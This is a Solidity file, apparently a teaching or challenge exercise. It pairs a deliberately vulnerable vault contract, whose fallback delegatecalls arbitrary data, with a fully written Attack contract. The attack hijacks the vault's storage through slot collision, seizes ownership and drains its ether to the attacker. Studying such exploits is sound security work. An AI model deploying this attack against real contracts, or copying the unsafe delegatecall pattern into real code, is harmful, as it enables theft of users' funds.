// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract NumberLib {
    uint public base;
    uint public currentNumber;

    //set the base
    function setBase(uint _base) public {
        base = _base;
    }

    //compute base + offset
    function getNumber(uint offset) public {
        currentNumber = base + offset;
    }
}

contract WithdrawalVault {
    address public numberLibrary; 
    
    // the current number to withdraw
    uint public currentNumber; 
    
    // the starting offset - zero initialized
    uint public offsetCounter; 
    
    // the function selector
    bytes4 constant seqSig = bytes4(keccak256("getNumber(uint256)"));

    address owner;

    // constructor - loads the contract with ether
    constructor(address _numberLibrary) payable {
        numberLibrary = _numberLibrary;
        owner = msg.sender;
    }

    //this function withdraws money 
    function withdraw() public {
        if(msg.sender == owner) {
            offsetCounter += 1;    
            (bool status,) = numberLibrary.delegatecall(abi.encodePacked(seqSig, offsetCounter));
            payable(msg.sender).transfer(currentNumber * 1 ether);
        }
    }
    
    // allow users to call other number library functions if necessary
    fallback() external {
        (bool status,) = numberLibrary.delegatecall(msg.data);
    }
}


contract Attack {
    // Storage layout is the same as WithdrawalVault contract
    uint public currentNumber; 
    address public numberLibrary; 
    uint public offsetCounter; 
    bytes4 constant seqSig = bytes4(keccak256("getNumber(uint256)"));
    address public owner;

    // Address of vault to be hacked by this Attack contract, namely: victim :)
    address public vault;

    constructor(address _vault) {
        vault = _vault;        
    }

    function attack() public {
        // Replace address of WithdrawalVault's numberLibrary with Attacker's address
        // Now WithdrawalVault's numberLibrary points to this contract
        // Basically we steal numberLibrary of victim
        vault.call(abi.encodeWithSignature("setBase(uint256)", uint(uint160(address(this)))));

        // Call Attacker's setBase(), and change owner of WithdrawalVault with Attacker's address
        // Here i give an arbitrary parameter: 1. This can be anything.
        // See the overwritten setBase(uint offset) function below
        vault.call(abi.encodeWithSignature("setBase(uint256)", 1));
        
        // Withdraw money, from victim contract to this contract
        vault.call(abi.encodeWithSignature("withdraw()"));
    }

    // Overwritten setBase() function
    // When victim calls numberlib.setBase(), it will trigger this function
    // See that function signature is the same as NumberLib's setBase(uint offset)
    // And important part is that when this function is called, withdrawalVault's owner -
    //   will be replaced by this contract's address (Attack contract)
    function setBase(uint offset) public {
        owner = msg.sender;
    }

    // Overwritten getNumber() function that is being called from withdrawalVault's withdraw() function
    // See that we trigger this function by calling victim's withdraw() function above
    function getNumber(uint offset) public {
        payable(msg.sender).transfer(address(this).balance);
    }

    // I personally put this function to take all money from Attack contract's to my own personal wallet
    function collect() public{
        payable(msg.sender).transfer(address(this).balance);
    }
    
    // As we forced victim to send all money to Attack contract,
    //   there will be an inter-contract money transfer.
    // So this function should appear here . 
    receive() external payable {
    }
}